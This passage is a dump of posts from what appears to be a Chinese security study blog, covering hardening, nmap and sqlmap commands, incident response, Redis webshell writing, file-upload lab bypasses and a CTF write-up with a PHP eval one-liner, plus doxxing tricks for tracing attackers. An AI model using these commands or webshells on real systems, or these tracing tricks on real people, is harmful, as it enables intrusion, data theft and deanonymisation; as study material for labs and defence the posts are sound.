日志，配置日志目录权限，或者设置日志服务器记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查 IP 协议安全要求 12345远程登录取消 telnet 采用 ssh设置 /etc/hosts.allow 和 deny禁止 ICMP 重定向禁止源路由转发防 ssh 破解，iptables (对已经建立的所有链接都放行，限制每分钟连接 ssh 的次数)+ denyhost (添加 ip 拒绝访问) Windows 安全基线检查主要包括五个方面：身份鉴别、访问控制、安全审计、资源控制、剩余信息保护 身份鉴别 1234567更改缺省账户检查Guest用户是否禁用密码复杂性要求密码长度最小不能小于8位 访问控制 1234567共享账户检查远程关机授权本地关机授权帐户登陆 安全审计 123456用户登录日志记录系统日志完备性检查登录超时管理 资源控制 123登录超时管理远程登录超时配置 剩余信息保护 12345不显示上次的用户名关机前清除虚拟内存页面不启用可还原的加密来存储密码 中间件基线规范（APACHE） 配置 12345账号授权日志session 过期时间（防ddos）绑定监听地址 禁止 1234目录权限访问外部文件CGI非法HTTP方法（PUT DELETE） 隐藏 12服务版本号重定向错误页面 删除 12配置文件默认安装的无用文件 Linux、Windows安全加固 IIS 服务器应该做哪些方面的保护措施？123456789101112131415保持 Windows 升级使用 IIS 防范工具移除缺省的 Web 站点如果你并不需要 FTP 和 SMTP 服务，请卸载它们有规则地检查你的管理员组和服务:严格控制服务器的写访问权限设置复杂的密码减少/排除 Web 服务器上的共享禁用 TCP/IP 协议中的 NetBIOS使用 TCP 端口阻塞仔细检查 .bat 和 .exe 文件：每周搜索一次 .bat管理 IIS 目录安全使用 NTFS 安全管理用户账户审计你的 Web 服务器","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"安全排查","slug":"安全排查","permalink":"http://xjuun.github.io/tags/%E5%AE%89%E5%85%A8%E6%8E%92%E6%9F%A5/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"nmap与sqlmap使用","slug":"工具使用","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:47:02.736Z","comments":true,"path":"2022/05/10/工具使用/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","excerpt":"","text":"nmap 1234567891011121314151617181. nmap -sT 192.168.96.4 //TCP连接扫描，不安全，慢2. nmap -sS 192.168.96.4 //SYN扫描,使用最频繁，安全，快7. nmap 192.168.96.4 -p &lt;portnumber&gt; //对指定端口扫描8. nmap 192.168.96.1/24 //对整个网段的主机进行扫描11. nmap -sV 192.168.96.4 //对端口上的服务程序版本进行扫描12. nmap -O 192.168.96.4 //对目标主机的操作系统进行扫描14. nmap -A 192.168.96.4 //强力扫描，耗时长18. nmap -D &lt;假ip&gt; 192.168.96.4 //发送参杂着假ip的数据包检测21. nmap -v 192.168.96.4 //显示冗余信息(扫描细节) sqlmap 1234567891011121314sqlmap.py -u &quot;url&quot;#检测目标网站是否存在注入sqlmap.py -u &quot;url&quot; --dbs#获取对方数据库所有库的名称sqlmap.py -u &quot;url&quot; -D &quot;security&quot; --table#获取security库下的表sqlmap.py -u &quot;url&quot; -D &quot;security&quot; -T &quot;email,users&quot; --column#获取email表，users表中的字段sqlmap.py -u &quot;url&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id,username,password&quot; --dump#导出数据指定的数据sqlmap.py -u &quot;url&quot; --dump-all#拖库，即把网站注册用户的资料数据库盗走的行为sqlmap.py -u &quot;url&quot; -r 1.txt -p &quot;参数名&quot;#post型注入，-p指定哪个参数注入 post注入：先burp抓包，保存为txt，然后在sqlmap里面-r txt -dbms burpwireshark","categories":[{"name":"工具","slug":"工具","permalink":"http://xjuun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"nmap","slug":"nmap","permalink":"http://xjuun.github.io/tags/nmap/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://xjuun.github.io/tags/sqlmap/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"http://xjuun.github.io/categories/%E5%B7%A5%E5%85%B7/"}]},{"title":"应急响应与溯源方案","slug":"应急响应与溯源方案","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:49:21.460Z","comments":true,"path":"2022/05/10/应急响应与溯源方案/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%8E%E6%BA%AF%E6%BA%90%E6%96%B9%E6%A1%88/","excerpt":"","text":"收集信息：收集客户信息和中毒主机信息，包括样本 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等 抑制范围：隔离使受害⾯不继续扩⼤ 深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源 清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门 账号防止事件扩大，处理完毕后恢复生产 产出报告：整理并输出完整的安全事件报告 个人认为可以在发现的有情况的时候，马上百度，查找相关事件的信息，自己有把握就处理，没有把握就上报 信息收集123456789信息收集主要是做：流量、日志、可疑进程的内存、失陷系统镜像、恶意样本、客户资产收集、资产相关漏洞测试报告、防御设备的日志。【请注意：确认有索取这些信息的权限】 判断事件类型12345678事件类型分为7类：大规模沦陷、挖矿病毒、勒索病毒、无文件落地、不死（顽固）马、钓鱼应急响应、数据劫持。 抑制范围（1）切断网络 情况分很多种：失陷后业务仍正常运行、失陷后业务受滞、失陷后业务停摆。不同的情况，网络切断因地制宜。 切断网络的目的：观察病毒行为、观察流量特征、阻断对内通信、阻断对外连接。 （2）阻断传播 传播包括：对内传播（感染）、对外传播（外联） 对内传播（感染）：进程注入/迁移、第三方软件感染、服务传播（ftp/ssh爆破等） 对外传播（外联）：挖矿行为、外联攻击、c2通信 阻断传播应从：软件层面、流量层面、代码层面、网络层面。例如：排查软件被劫持、排查流量发现无文件落地、利用代码审计发现容器加载内存马、阻断网络发现通过服务传播的病毒。 （3）隔离核心资产/隔离受害主体（群体） 这一步是应急响应的最终目的，无论实施过程如何、无论使用什么工具都必须保证被保护与沦陷方的隔离。 隔离核心资产是为了做到三个原则：保护、避害、不损害。 隔离受害主体（群体）是为了保护第一现场、收集攻击者信息等。 深入分析日志分析、进程分析、启动项分析、样本分析方便后期溯源 日志主要注意的是：时间、动作、结果；这个行为什么时候开始、什么时候结束，这个动作是登陆、退出、修改等、造成的结果是登陆成功/失败、上传/下载了文件、执行了代码等。 流量主要注意的是：状态码、交互过程、数据合理性；每一次交互的状态码，交互过程中是否符合该种协议的正确交互过程，每个字段的填充、每次流量的渲染是否正常。 样本主要注意的是：启动方式、伪装方式、作用；根据启动方式去选择沙箱或者分析工具；伪装方式判断是否加壳做免杀和打击方式；根据作用去判断受害范围。启动项进程粗略的分为静态和动态，日志属于静态信息需要应急人员清晰分辨出日志表达的内容和快速筛选出可疑的点。流量和样本属于动态信息，应急人员需要拥有一定的渗透能力去分辨交互行为。 （2）行为分析&amp;还原攻击过程 从行为出发，还原攻击路径，推演攻击过程。 行为分析基于三大件分析，结合系统表现出来的情况做分析，例如：启动项、启动脚本、进程、内存等。 还原攻击过程需要对攻击大致的情况有一个综合判断，可以理解为——威胁模型建立（SDL），必须具备渗透能力，再此基础上放入沙箱重新复现攻击过程，对后续的步骤提供帮助。 清理处置杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门，加固没啥好讲的，打补丁、对系统进行限制（网络隔离、行为管理等）、升级防御设备、完善防御流程（防御设备的部署、人员的部署、规则库的升级）账号防止事件扩大，处理完毕后恢复生产 产出报告整理并输出完整的安全事件报告 溯源方案1.攻击源捕获安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等日志与流量分析，异常的通讯流量、攻击源与攻击目标等服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息2.溯源反制手段 IP 定位技术 根据IP定位物理地址–代理 IP 溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息 ID 追踪术 ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配 溯源案例：利用 ID从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息 网站 url 域名 Whois 查询–注册人姓名、地址、电话和邮箱 –域名隐私保护 溯源案例：通过攻击 IP历史解析记录/域名，对域名注册信息进行溯源分析 恶意样本分析 提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析 溯源案例：样本分析过程中，发现攻击者的个人 ID 和QQ，成功定位到攻击者 社交账号 基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等 利用条件：可以找到相关社交网站的jsonp 接口泄露敏感信息，相关网站登录未注销 技巧域名、ip 反查目标个人信息支付宝转账，确定目标姓氏淘宝找回密码，确定目标名字企业微信手机号查公司名称REG007 查注册应用、网站程序 PDB 信息泄露","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"http://xjuun.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"溯源","slug":"溯源","permalink":"http://xjuun.github.io/tags/%E6%BA%AF%E6%BA%90/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"Redis未授权访问","slug":"未授权访问redis","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:48:20.305Z","comments":true,"path":"2022/05/10/未授权访问redis/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEredis/","excerpt":"","text":"Redis未授权访问漏洞原理Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用一定的策略（如防火墙）， Redis会被 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 来进行攻击操作 2.2写入webshell前提条件：1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限 操作：1在redis的src目录下执行命令 1./redis -cli -h 目标ip:6379 2把shell写入web路径下，假设web路径为/home/www，首先设置redis保存的路径 1config set dir /home/www #设置redis保存的路径 3.设置保存时的文件名。 1config set dbfilename shell.php #设置保存时的文件名 4.写入webshell 12set webshell “”\\r\\n\\r\\n&lt;?php phpinfo();?&gt;\\r\\n\\r\\n&quot;&quot;#\\r\\n是为了换行，因为redis在保存的时候会把许多东西和value（在这里时是双引号中的内容”）保存在一起，为了保证代码可以运行，我们加上换行符。 2.3写入一个ssh私钥进行连接2.4写入文件（反弹shell）到计划任务目录下执行","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"未授权访问","slug":"未授权访问","permalink":"http://xjuun.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"逻辑漏洞","slug":"逻辑漏洞","permalink":"http://xjuun.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"渗透测试流程","slug":"渗透测试流程","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:44:04.566Z","comments":true,"path":"2022/05/10/渗透测试流程/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/","excerpt":"","text":"对于web应用的渗透测试，大致可分为三个阶段： 信息收集、漏洞发现以及漏洞利用 。在实践过程中需要进一步明细测试的流程，以下通过9个阶段来描述渗透测试的整个流程： 1.明确目标 授权目标测试的范围和测试程度1）确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块 2）明确程度：能渗透到什么程度（是发现漏洞为止还是继续利用漏洞）、是否有时间限制、能否修改上传、能否提权…是否允许数据破坏？是否允许阻断业务正常运行？接入方式？外网和内网？渗透过程是否需要考虑社会工程？ 2.分析风险，获得授权分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本…由测试方书写实施方案初稿并提交给客户进行审核。在审核完成后，从客户，获取对测试方进行书面委托授权书，授权测试方进行渗透测试。 3.信息收集在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。利用百度等搜索引擎搜索：获得后台、未授权页面、敏感url等信息 基础信息：IP，网段，域名，端口系统信息：操作系统版本应用信息：各端口的应用，例如web应用，邮件应用等版本信息：所有探测到的版本服务信息：服务器类型、版本人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等防护信息：试着看能否探测到防护设备4.漏洞探测（手动&amp;自动）利用上一步中列出的信息，使用相应的漏洞检测是否存在一下漏洞： SQL注入漏洞XSS跨站脚本攻击漏洞CSRF跨站请求伪造漏洞文件上传漏洞暴力破解漏洞 5.漏洞验证将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。 6.信息分析为下一步实施渗透做准备 精准攻击：准备好上一步探测到的漏洞，用来精准攻击绕过防御机制：是否有防火墙等设备，如何绕过定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）攻击代码：经过试验得来的代码，如xss代码，sql注入语句等7.利用漏洞，获取数据 实施攻击：根据前几步的结果，进行攻击获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）进一步渗透：内网入侵，敏感目标持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等清理痕迹：清理相关日志（访问，操作），上传文件等8.信息整理 整理渗透工具：整理渗透过程中用到的代码，poc，exp等整理收集信息：整理渗透过程中收集到的一切信息整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息目的：为了最后形成报告，形成测试结果使用。9.形成报告 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告补充介绍：要对漏洞成因，验证过程和带来危害进行分析修补建议：当然要对所有产生的问题提出合理高效安全的解决办","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://xjuun.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"系统日志（Linux，Windows，中间件）","slug":"系统日志（linux，windows，中间件）","date":"2022-05-10T14:33:35.000Z","updated":"2022-05-10T14:50:16.193Z","comments":true,"path":"2022/05/10/系统日志（linux，windows，中间件）/","link":"","permalink":"http://xjuun.github.io/2022/05/10/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%EF%BC%88linux%EF%BC%8Cwindows%EF%BC%8C%E4%B8%AD%E9%97%B4%E4%BB%B6%EF%BC%89/","excerpt":"","text":"Windows主要有以下三类日志记录系统事件：• 应用程序日志• 系统日志• 安全日志系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 应用程序日志记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。 默认位置： %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 系统日志记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 安全日志打开事件查看器，可以看到相关的事件ID和事件描述事件ID对应的事件描述： 登录成功可以看到一些可疑的账号登录，登录失败可以发现一些爆破的痕迹。 点击筛选日志选项，输入事件ID，就可以搜索出特定事件，并且匹配出特定事件的次数。我们可以根据事件发生次数以及具体时间来推断系统遭受攻击的情况。比如可以根据登录失败次数发现哪些账号有爆破的嫌疑，根据系统开关机事件来断定是否是异常情况。 LinuxLinux日志的默认目录是/var/log/日志文件位置及说明 重点日志登录失败记录：/var/log/btmp //lastb(lastb是对应日志的直接系统命令)最后一次登录：/var/log/lastlog //lastlog登录成功记录: /var/log/wtmp //last登录日志记录：/var/log/secure目前登录用户信息：/var/run/utmp //w、who、users历史命令记录：history仅清理当前用户： history -c Linux 自带日志分析命令分析Linux日志，基本不用其他三方工具。系统自带很多非常有用的命令。常用的shell主要有：grepawksedfindcatmore webLinux中，web日志也在/var/log/下，进入对应web服务器目录既可查看。比如apache的日志就是在/var/log/apache/下，日志主要access.log和error.log。Windows中，使用类似phpstudy的建站模块的话，可以直接在phpstudy目录下找到access.log和error.log。如果是IIS日志，可以打开管理工具，选择其中的IIS服务器进行日志查看。 常用命令1、列出当天访问次数最多的IP命令：cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2、查看当天有多少个IP访问：awk ‘{print $1}’ log_file|sort|uniq|wc -l 3、查看某一个页面被访问的次数：grep “/index.php” log_file | wc -l 4、查看每一个IP访问了多少个页面：awk ‘{++S[$1]} END {for (a in S) print a,S[a]}’ log_file 5、将每个IP访问的页面数进行从小到大排序：awk ‘{++S[$1]} END {for (a in S) print S[a],a}’ log_file | sort -n 6、查看某一个IP访问了哪些页面：grep ^111.111.111.111 log_file| awk ‘{print $1,$7}’","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"日志","slug":"日志","permalink":"http://xjuun.github.io/tags/%E6%97%A5%E5%BF%97/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"反弹shell与端口转发","slug":"反弹shell 端口转发","date":"2022-05-07T02:10:12.000Z","updated":"2022-05-10T14:38:59.073Z","comments":true,"path":"2022/05/07/反弹shell 端口转发/","link":"","permalink":"http://xjuun.github.io/2022/05/07/%E5%8F%8D%E5%BC%B9shell%20%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","excerpt":"","text":"反弹shell，是指目标向服务器端口发起请求，发送目标shell命令行的输入输出，服务器通过监听端口来获得请求内容。reverse shell与telnet、ssh等标准shell对应，本质上是网络概念的客户端/服务端的角色反转。 为什么不正向连接？通常用于连接目标机器防火墙受限、权限不足、端口被占用等情形。正向连接，包括远程桌面、Web服务、ssh、Telnet等。端口转发就是把网络流量从一个网络监听者（称为一个“端口”）发送到另一个上，无论这两个端口是否属于同一台电脑。在这里，端口不是某个物理实体，而是一个监听网络活动的软件程序。 端口转发端口转发就是将一个端口，这个端口可以本机的端口也可以是本机可以访问到的任意主机的端口，转发到任意一台可以访问到的IP上，通常这个IP是公网ip","categories":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://xjuun.github.io/tags/%E7%AC%94%E8%AE%B0/"}],"keywords":[{"name":"网安笔记","slug":"网安笔记","permalink":"http://xjuun.github.io/categories/%E7%BD%91%E5%AE%89%E7%AC%94%E8%AE%B0/"}]},{"title":"burp 本地不抓包解决办法","slug":"burp-本地不抓包解决办法","date":"2022-04-24T12:06:39.000Z","updated":"2022-04-24T12:17:48.771Z","comments":true,"path":"2022/04/24/burp-本地不抓包解决办法/","link":"","permalink":"http://xjuun.github.io/2022/04/24/burp-%E6%9C%AC%E5%9C%B0%E4%B8%8D%E6%8A%93%E5%8C%85%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/","excerpt":"","text":"在用burp抓本地靶场uoload上传的文件时，老是抓不了包，每次都是文件已经上传到upload文件夹了，但burp没反应，简单记录一下解决步骤到网上搜了一下大佬的解决方案：1、首先打开Firefox菜单–设置2、在最上方的框框里面，将about:preferences修改为about:config3、点击页面“接受风险并继续”4、在搜索框输入：network.proxy.allow_hijacking_localhost5、将页面false点击修改为true","categories":[{"name":"工具","slug":"工具","permalink":"http://xjuun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"burp","slug":"burp","permalink":"http://xjuun.github.io/tags/burp/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"http://xjuun.github.io/categories/%E5%B7%A5%E5%85%B7/"}]},{"title":"upload labs","slug":"upload-labs","date":"2022-04-23T12:05:52.000Z","updated":"2022-05-11T13:09:27.349Z","comments":true,"path":"2022/04/23/upload-labs/","link":"","permalink":"http://xjuun.github.io/2022/04/23/upload-labs/","excerpt":"","text":"Pass -01（js检查）题目基于前端js过滤，只能上传图片格式的文件，所以我们用一句话木马，改后缀上传后，用burp抓包，修改文件后缀为php，然后用蚁剑连接，注意：文件没有上传在具体题目中的文件夹中，所以我们在用蚁剑连接的时候，需要注意其地址 Pass -02（只验证Content-type）根据源代码我们可以发现，这一关是常见验证中的文件类型验证，也就是验证MIME信息所以这里可以直接上传php文件，然后用burp抓包，修改content-type为图片类型： 1image/jpeg、image/png、image/gif 然后蚁剑连接 Pass -03（黑名单绕过）先上传一个php文件，发现，上传设置了黑名单，查看源代码： 所以可以通过上传其他可解析文件，.phtml .phps .php5 .pht前提是apache的httpd.conf中有配置代码 所以我们这里可以上传一个php3, phtml，phps .php5 .pht文件实现绕过，注意这题当我们上传的时候文件名会变，我们可以在burp的repeater数据包回显中看，然后蚁剑连接 注意：上传后文件名会发生改变 Pass -04 （.htaccess绕过）查看源代码会发现其过滤了很多文件格式，这时，我们可以尝试上传一个.htaccess配置文件，它将上传图片当作php代码进行解析，首先创建一个.htaccess文件，里面写上代码 1SetHandler application/x-httpd-php 然后我们可以直接上传一个改为图片格式的一句话木马，然后用蚁剑直接连接图片名，即可成功 Pass -05（大小写绕过）与四题不同的是没有将其后缀转换为小写因此可以使用大小绕过，上传文件后缀为.Php的文件，然后蚁剑连接即可 Pass -06（空格绕过）查看源码，对比前面的题，会发现这里没有删除文件首尾的空格，所以可以用空格进行绕过我们上次文件尝试抓包在文件名后面加一个空格注意：如果我们是在上传前修改文件名的时候加，上传的时候会被自动去掉，所以我们这里需要抓包，然后添加空格 Pass -07（点绕过）观察对比前面关卡的源代码，可以发现其没有对点进行过滤，所以上传php文件抓包后在其后缀后面添加一个.,完成绕过 Pass -08（::$DATA绕过）观察对比前面关卡的源代码，可以发现其没有对点进行过滤，所以上传php文件抓包后在其后缀后面添加一个::$DATA,完成绕过 Pass -09（拼接绕过）查看源代码后，发现它先将后缀名后的.删除，然后删除空格。我们可以把文件后缀改成.php. .,经过代码处理后变成.php.绕过上传php文件，然后抓包，改后缀，蚁剑连接 Pass -10（双写绕过）发现第八行的函数： 1$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这个代码的意思就是把带有黑名单中的后缀替换为空。这时我们考虑双写绕过。如上传的.pphphp就会变成.php绕过 总结：1-10题都可以用.php. .来绕过 Pass -11（GET型0x00截断）查看源代码，可以得知是一个白名单，只允许上传jpg,png,gif格式的文件。但是上传路径是可以控制的，可以使用%00进行截断。%00只能用于php版本低于5.3的。利用正常上传后的文件会保存为：/upload/2.php%002.jpg，文件在读取名字的时候，因为被%00截断，所以只会读取到%00就会被截断停止，从而以php文件执行 Pass -12（POST型0x00截断）Pass -13（图片马）分析源代码得：其利用fread函数来判断是否是图片源码意思读取上传文件的前两个字节内容，unpack解码后，使用intval转换为10进制，默认为10进制，根据转换后的结果判断图片类型。 图片马生成：将图片和脚本放在同一目录下，执行cmd命令，在cmd中执行（这里的图片要是真是的图片） 1copy /b 图片+php脚本 新文件名 然后上传图片，得到上传后的图片名和地址注意：图片马是运用文件包含漏洞，通过文件包含漏洞来运行图片中得代码，所以需要一个解析文件，来运行图片马，如图：解析代码是： 123456789101112 &lt;?php/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/header(&quot;Content-Type:text/html;charset=utf-8&quot;);$file = $_GET[&#x27;file&#x27;];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; 其中file是图片地址，得url是： 1http://5063f052-6da9-4a3d-aa1f-331c250cf86c.node4.buuoj.cn:81/include.php?file=upload/xxx.jpg 当图片马中的代码被解析后，再运用蚁剑连接，其连接url地址就是上面得那个地址 Pass -14（图片马）利用getimagesize($filename)函数判断文件是否为图片 Pass -15（图片马）使用exif_imagetype()函数判断是否为图片文件 Pass -16（图片马+二次渲染）验证过程：判断后缀与MIME类型是否符合要求，符合后生成新图像（内容不正确会失败，返回false，相当于多了一次验证），生成新图像失败就unlink删除，成功就根据系统时间给文件命名，再通过imagejpeg类似函数使用原图像资源创建新图像（二次渲染）。相关函数说明： 123456789basename(string $path [,string $suffix]) //返回路径中的文件名部分imagecreatefromjpeg(string $filename)imagecreatefrompng(string $filename) imagecreatefromgif(string $filename) //由文件或URL创建一个新图像，内容不对则失败返回false，成功后返回图像资源srand([int $seed ]) //用seed播下随机数发生器种子strval(mixed $var) //返回字符串类型的varimagejpeg(resource $image [,string $filename [,int $quality]])//从image图像以filename为文件名创建一个JPEG图像imagepng(resource $image [,string $filename]) //从 image 图像以filename为文件名创建一个PNG图像或文件imagegif(resource $image [,string $filename]) //从 image 图像以filename为文件名创建一个GIF图像或文件 先合成一个gif一个图片马，然后上传，抓包得到上传图片的地址，下载上传的图片，对比上传前的图片，找到未改变的地方（很多地方都可以，但我以为这个地方很小，以为要慢慢找，hhh），插入一句话木马后，再次上传这张图片，得到其新的图片名字，然后就跟上一关差不多，解析图片里面的木马，蚁剑连接。总结：千万不要想当然，用嘴做题， Pass -17（白名单验证，条件竞争）这一题在buu上面因为访问过于频繁，后面直接被禁了，自己本地有点不太敢搞，我怕我的系统似乎承受不了，，，其原理就是利用它会将我们上传的文件短暂的储存在服务器中，然后 Pass -18（白名单验证，图片马）个人认为这里和13关差不多，只不过这里需要知道上传后图片重命名后土木的名字，然后解析图片马，再用蚁剑连接 Pass -19（黑名单验证，点号绕过）两种方式绕过：1.这里会上传文件的名称，我们可以用burp抓包，然后再修改，改为php，然后用%00截断，再加上jpg后缀，完成绕过2、文件夹的形式，这里会构成upload/xxx.jpg,但如果我们这里修改为upload/upload/xxx.php/.,我们在上传验证的时候，会以为其文件名为.但实际上我们上传的文件名确为upload/xxx.php Pass -20（白名单绕过，图片马）数组，分析其代码，得到其上传的时候会将图片名分为数组，分别为：文件名 ，.,后缀，在这里我们通过修改其分组，完成上传，将其分组数据修改为：文件名.php/., ,后缀，类似于文件夹上传，验证的时候会正常通过，最终为：文件名.php/.jpg，但上传后的文件名确为：文件名.php 总结：20到题边看wp，遍做，用了整整一天，怎么说呢！在做题的过程中会遇到很多网上的wp都没提过的问题，比如蚁剑测试连接的时候报错，但保存后却可以正常连接，你敢信？再比如burp抓不到本地的数据包，或者是在改gif图片，对比前后有哪些地方不一样的时候，你以为只是很少的一部分不一样，但其实呢？很容易找出不一样的地方来，emmm，其中还有在本地搭建的时候，要注意php版本的问题，可能现在的php版本不支持，或者其它的设备软件问题，总之在做题的过程中，要学会有自己的思考，要善于运用百度，牢记：纸上得来终觉浅，绝知此事要躬行，还是要多刷题，准备过几天不看wp，自己来个二刷。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"http://xjuun.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"keywords":[{"name":"CTF","slug":"CTF","permalink":"http://xjuun.github.io/categories/CTF/"}]},{"title":"极客大挑战 2019 Upload 1","slug":"极客大挑战-2019-Upload 1","date":"2022-04-20T15:23:49.000Z","updated":"2022-04-20T15:30:02.741Z","comments":true,"path":"2022/04/20/极客大挑战-2019-Upload 1/","link":"","permalink":"http://xjuun.github.io/2022/04/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload%201/","excerpt":"","text":"还是文件上传得题，上传有一句话木马写的且改后缀为jpg得文件，会出现提示说文件包含`&lt;?传不了，所以修改木马为： 1GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt; 打开burp，抓包修改文件后缀，发现php上传不了，常规文件后缀为：php2, php3, php4, php5, phps, pht, phtm, phtml这里修改后缀为：phtml可正常上传 但上传后没有返回图片保存地址，一般上传图片都保存在upload,所以这里也是，用蚁剑连接成功，找到flag文件 总结：一句话木马： 1GIF89a? &lt;script 